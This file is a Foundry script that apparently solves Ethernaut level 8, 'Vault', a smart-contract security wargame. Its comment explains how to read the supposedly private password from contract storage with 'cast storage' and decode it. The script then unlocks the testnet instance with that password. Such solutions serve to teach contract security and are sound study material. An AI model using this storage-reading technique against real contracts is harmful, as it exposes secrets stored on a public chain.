// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Vault} from "../../src/level-08/EthernautVault.sol";

contract VaultSolution is Script {
    Vault vault = Vault(0xC7f8188AC245f89AF33ADEe2E3aCD05d0466162E);

    /**
     * @notice To retrieve the password, we only need to see it in the contract storage.
     * Using `cast storage {INSTANCE_ADDRESS} 1 --rpc-url sepolia`. Then, `cast parse-bytes32-string 0x412076657279207374726f6e67207365637265742070617373776f7264203a29`
     */

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        vault.unlock(bytes32("A very strong secret password :)"));
    }
}
